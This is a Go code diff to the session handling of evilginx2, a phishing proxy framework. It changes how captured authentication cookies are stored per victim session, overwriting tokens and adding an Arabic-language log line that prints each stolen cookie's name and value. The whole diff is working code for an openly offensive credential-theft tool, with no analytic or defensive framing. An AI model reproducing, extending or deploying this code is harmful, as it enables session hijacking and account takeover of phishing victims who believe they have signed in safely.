@@ -1,9 +1,11 @@
 package core
 
 import (
+	"strings"
 	"time"
 
 	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 type Session struct {
@@ -70,24 +72,22 @@ func (s *Session) SetCustom(name string, value string) {
 	s.Custom[name] = value
 }
 
-func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
+func (s *Session) AddCookieAuthToken(domain string, name string, value string, path string, httpOnly bool, expires time.Time) bool {
+	domain = strings.ToLower(domain)
+	
 	if _, ok := s.CookieTokens[domain]; !ok {
 		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
-
-	if tk, ok := s.CookieTokens[domain][key]; ok {
-		tk.Name = key
-		tk.Value = value
-		tk.Path = path
-		tk.HttpOnly = http_only
-	} else {
-		s.CookieTokens[domain][key] = &database.CookieToken{
-			Name:     key,
-			Value:    value,
-			HttpOnly: http_only,
-		}
+	
+	s.CookieTokens[domain][name] = &database.CookieToken{
+		Name:     name,
+		Value:    value,
+		Path:     path,
+		HttpOnly: httpOnly,
 	}
 
+	log.Success("تمت إضافة كوكي إلى الجلسة: %s=%s (المجال: %s)", name, value, domain)
+	return true
 }
 
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
